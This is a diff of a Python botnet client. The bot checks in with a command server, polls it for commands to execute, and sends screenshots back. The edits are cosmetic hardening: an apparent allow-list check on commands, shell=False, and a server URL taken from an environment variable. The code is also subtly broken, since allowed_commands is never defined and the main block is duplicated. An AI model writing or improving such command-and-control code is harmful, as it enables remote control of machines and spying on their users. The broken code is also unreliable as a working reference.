@@ -27,7 +27,7 @@ def check_in(server_url):
 
 def receive_commands(server_url):
     while True:
-        response = requests.get(f"{server_url}/get_commands/bot_id")
+        response = requests.get(f"{server_url}/get_commands/{bot_id}")
         if response.status_code == 200:
             commands = response.json()
             for command in commands:
@@ -58,14 +58,13 @@ def send_screenshot(server_url, filepath):
 
 def execute_command(command_data):
     command = command_data.get('command')
-    if command:
-        print(f"Executing: {command}")
-        # Example safe command execution
+    if command and command in allowed_commands:  # Only allow predefined commands
         try:
-            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, text=True)
+            result = subprocess.run(command, shell=False, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             print("Command output:", result.stdout)
         except subprocess.CalledProcessError as e:
             print("Failed to execute command:", e)
+
 
 @app.route('/send_command', methods=['POST'])
 def handle_command():
@@ -85,9 +84,14 @@ def register_bot(server_url, bot_id):
         print("Registration failed", response.json())
 
 if __name__ == "__main__":
-    server_url = "http://127.0.0.1:5000"
+    server_url = os.getenv('SERVER_URL', 'http://127.0.0.1:8080')
     bot_id = "bot1"
-    register_bot(server_url, bot_id)
+    if check_in(server_url):
+        try:
+            receive_commands(server_url)
+        except Exception as e:
+            print(f"Error occurred: {e}")
+
 
 server_url = os.getenv('SERVER_URL', 'http://127.0.0.1:8080')  # Use environment variable for server URL
 if check_in(server_url):
